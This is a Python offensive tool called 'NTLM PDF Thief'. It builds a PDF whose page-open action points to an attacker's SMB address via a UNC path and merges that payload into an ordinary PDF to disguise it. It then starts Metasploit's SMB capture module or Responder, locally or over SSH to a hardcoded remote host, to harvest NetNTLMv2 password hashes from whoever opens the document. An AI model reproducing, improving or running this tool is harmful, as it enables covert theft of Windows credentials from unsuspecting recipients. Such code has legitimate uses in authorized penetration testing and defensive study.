#!/usr/bin/env python3
# coding: utf-8
# Created by Rouvès Quentin
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program. If not, see <http://www.gnu.org/licenses/>.

import sys
import os
import random
import fileinput
import argparse
import subprocess
import time

from minipdf import *
from PyPDF2 import PdfFileMerger, PdfFileReader

def merge_pdf(pdf, output="output.pdf"):
    print ("\t[+] Merge pdf")
    merger = PdfFileMerger()

    # Add the payload to the merger
    f_payload = open("payload.pdf", 'rb')
    merger.append(PdfFileReader(f_payload))
    f_payload.close()

    # Add the pdf to the merger
    file = open(pdf, 'rb')
    merger.append(PdfFileReader(file))
    file.close()

    # Write all the appends to a new file
    print ("\t[+] Save merged file as: {}".format(output))
    merger.write("./" + output)


def create_payload(address, output="payload.pdf"):

    print ("\t[+] Create payload document")

    #The document
    doc = PDFDoc()

    #font
    font = PDFDict()
    font['Name'] = PDFName('F1')
    font['Subtype'] = PDFName('Type1')
    font['BaseFont'] = PDFName('Helvetica')

    #name:font map
    fontname = PDFDict()
    fontname['F1'] = font

    #resources
    resources = PDFDict()
    resources['Font'] = fontname
    doc += resources

    #contents
    action = PDFDict()
    action['Type'] = PDFName('Action')
    action['F'] = '(\\\\\\\\{}\\\\document)'.format(address)
    #action['D'] = '[ 1 0 R /Fit ]'
    action['D'] = '[ 0 /Fit ]'
    action['S'] = PDFName('GoToE')
    doc+= action

    #page
    page = PDFDict()
    page['Type'] = PDFName('Page')
    page['MediaBox'] = PDFArray([0, 0, 612, 792])
    page['Resources'] = PDFRef(resources)
    #page['Content'] = PDFDict({'O': PDFRef(action)})
    page['AA'] = PDFDict({'O': PDFRef(action)})
    #page['A'] = PDFRef(action)
    doc += page

    #pages
    pages = PDFDict()
    pages['Type'] = PDFName('Pages')
    pages['Kids'] = PDFArray([PDFRef(page)])
    pages['Count'] = PDFNum(1)
    doc += pages

    #add parent reference in page
    page['Parent'] = PDFRef(pages)

    #catalog
    catalog = PDFDict()
    catalog['Type'] = PDFName('Catalog')
    catalog['Pages'] = PDFRef(pages)
    doc += catalog

    doc.setRoot(catalog)

    file_output = open(output, 'wb')
    file_output.write(str(doc))
    file_output.close()

def launch_metasploit():
    command = "\'sudo msfconsole -x \"use auxiliary/server/capture/smb;set johnpwfile output-smb.john;exploit\"\'"

    tmp = str(input("\t[-] Would you like to launch Metasploit throught ssh or in local (ssh/local)? "))
    if (tmp.lower()=="ssh" or tmp.lower()=="s"):
        #host = input("\tHost's IP address: ")
        #username = input("\tUsername: ")

        host = "192.243.103.8"
        username = "hophouse"

        ssh_cmd = "ssh -t {0}@{1} {2}".format(username, host, command)
        ssh = subprocess.Popen(ssh_cmd, shell=True)

        while ssh.returncode is None:
            ssh.poll()

        """
        result = ssh.stdout.readlines()
        if result == []:
            error = ssh.stderr.readlines()
            print >>sys.stderr, "ERROR: %s" % error
        else:
            print result
            """
        print ("\t[+] Get result file from {}".format(host))
        scp_cmd = "scp {0}@{1}:output-smb.john_netntlmv2 ./".format(username, host, command)
        scp = subprocess.Popen(scp_cmd, shell=True)

        while scp.returncode is None:
            scp.poll()

    elif (tmp.lower()=="local" or tmp.lower()=="l"):
        print ("\n\t[*] Launching Metasploit\n")
        proc = subprocess.Popen(command, shell=True)
        while proc.returncode is None:
            proc.poll()
    else:
        print ("\t[+] Please launch this command: \t{}\n".format(command))


def main():
    responder = '/usr/sbin/responder'

    parser = argparse.ArgumentParser(description='NTLM PDF Thief\nAuthor: Rouvès Quentin')

    parser.add_argument('-o', type=str, dest="output", default=None, help="Output file")
    parser.add_argument('-d', type=str, dest="destination", default=None, help="SMB ip address")
    parser.add_argument('-p', type=str, dest="pdf", default=None, help="PDF file")
    parser.add_argument('-t', type=str, dest="tool", default=None, help="metasploit or responder")

    options = parser.parse_args()

    print ("[*] Informations")
    print ("\t[-] SMB IP destination: {}".format(options.destination))
    print ("\t[-] PDF file: {}".format(options.pdf))
    print ("\t[-] Output: {}".format(options.output))
    print ("\t[-] Tool: {}\n".format(options.tool))

    if options.output is None or options.destination is None or options.pdf is None:
        print ("[-] You should specify all the options.")
        print ("""
        usage: ntlm-pdf-thief.py [-h] [-o OUTPUT] [-d DESTINATION] [-p PDF] [-t TOOLS]

        NTLM PDF Thief Author: Rouvès Quentin

        optional arguments:
          -h, --help      show this help message and exit
          -o OUTPUT       Output file
          -d DESTINATION  SMB ip address
          -p PDF          PDF file
          -t TOOLS        Metasploit or Responder
        """)
        exit(-1)


    try:
        print ("[*] PDF Generation")
        # Create the payload
        create_payload(options.destination)

        if options.pdf is None:
            print ("\t[+] No pdf file to merge passed. You should use payload.pdf")

        merge_pdf(options.pdf, options.output)

        # Lauch metasploti and specific module
        if (options.tool == 'metasploit'):
            print ("\n[*] Metasploit")
            launch_metasploit()
        # Or launch Repsonder

        if (options.tool == 'responder'):
            print ("\n[*] Responder")

            # Check if responder is present
            if (not os.path.isfile(responder) and options.tools == "responder"):
                print("\t[!] Responder not found.")
                responder = raw_input("\t[+] Enter resonder path (Default /usr/sbin/responder): \n")

            command = responder + " -I " + options.interface
            subprocess.Popen(command, shell=True)


    except KeyboardInterrupt:
        exit(0)


if __name__ == "__main__":
    print ("""
           _   _  _____  _     ___  ___        ______ ______ ______
           | \ | ||_   _|| |    |  \/  |        | ___ \|  _  \|  ___|
           |  \| |  | |  | |    | .  . | ______ | |_/ /| | | || |_
           | . ` |  | |  | |    | |\/| ||______||  __/ | | | ||  _|
           | |\  |  | |  | |____| |  | |        | |    | |/ / | |
           \_| \_/  \_/  \_____/\_|  |_/        \_|    |___/  \_|
                       _____  _   _  _____  _____ ______
                       |_   _|| | | ||_   _||  ___||  ___|
                       | |  | |_| |  | |  | |__  | |_
                       | |  |  _  |  | |  |  __| |  _|
                       | |  | | | | _| |_ | |___ | |
                       \_/  \_| |_/ \___/ \____/ \_|

    """)

    main()
